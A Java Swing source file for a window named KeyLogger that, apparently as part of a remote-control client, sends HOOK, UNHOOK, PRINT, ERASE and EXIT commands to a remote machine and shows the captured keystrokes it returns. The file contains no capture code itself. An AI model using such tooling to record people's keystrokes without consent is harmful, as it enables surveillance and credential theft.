package Client;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.io.IOException;

public class KeyLogger extends JFrame {
    private JButton hookButton;
    private JButton unhookButton;
    private JButton printButton;
    private JButton eraseButton;
    private JButton exitButton;
    private JPanel mainPanel;
    private JScrollPane scrollPanel;
    private JLabel textLabel;


    public KeyLogger(Client client) {
        this.setContentPane(mainPanel);
        this.pack();
        this.setSize(500, 400);
        KeyLogger _this = this;
        hookButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.sendMess("HOOK");
            }
        });
        unhookButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.sendMess("UNHOOK");
            }
        });
        printButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.sendMess("PRINT");
                try {
                    String getData = client.getClientRecvMessage();
                    System.out.println(getData);
                    _this.textLabel.setText(getData);
                } catch (IOException ioe) {
                    System.out.println("Error " + ioe);
                }
            }
        });
        eraseButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.sendMess("ERASE");
                _this.textLabel.setText("");
            }
        });
        exitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                client.sendMess("EXIT");
                _this.dispose();
            }
        });
    }

    public void main(String args[]) {
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(KeyLogger.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(KeyLogger.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(KeyLogger.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(KeyLogger.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
    }
}
